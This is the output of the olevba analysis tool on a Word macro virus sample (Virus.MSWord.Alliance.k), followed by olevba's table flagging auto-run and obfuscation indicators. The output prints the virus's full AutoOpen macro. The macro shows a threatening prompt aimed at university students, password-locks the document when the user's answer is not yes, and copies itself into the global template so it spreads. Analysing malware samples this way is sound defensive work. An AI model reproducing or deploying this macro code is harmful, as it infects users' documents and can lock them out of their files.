olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Alliance.k
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Alliance.k - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Alliance.k - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim Fname$
Dim MacName$
Dim Button
On Error GoTo -1: On Error GoTo ErrorHandler
    
Fname$ = WordBasic.[FileName$]()
MacName$ = Fname$ + ":AutoOpen"

WordBasic.FileSummaryInfo Subject:="VIRUS WINWORD.FSKSM"
WordBasic.FileSummaryInfo Author:="The Skidz.....CE"

Button = WordBasic.MsgBox("ARE YOU A FSKSM STUDENT?" + Chr(13) + "ANSWER YES OR YOUR DOCUMENT WILL BE LOCKED BY MY PASSWORD !" + Chr(13) + "FAKULTI SAINS KOMPUTER DAN SISTEM MAKLUMAT", "UNIVERSITI TEKNOLOGI MALAYSIA", 4)

If Button = 0 Then
   WordBasic.FileSaveAs Password:="Saya!"
End If

WordBasic.MacroCopy MacName$, "Global:AutoNew", -1
WordBasic.MacroCopy MacName$, "Global:AutoOpen", -1

ErrorHandler:

        If WordBasic.IsDocumentDirty() = -1 Then
            WordBasic.MacroCopy "Global:AutoOpen", MacName$, -1
        End If
        WordBasic.FileSaveAs Format:=1

    
End Sub
-------------------------------------------------------------------------------
VBA MACRO NewMacros 
in file: Virus.MSWord.Alliance.k - OLE stream: 'NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

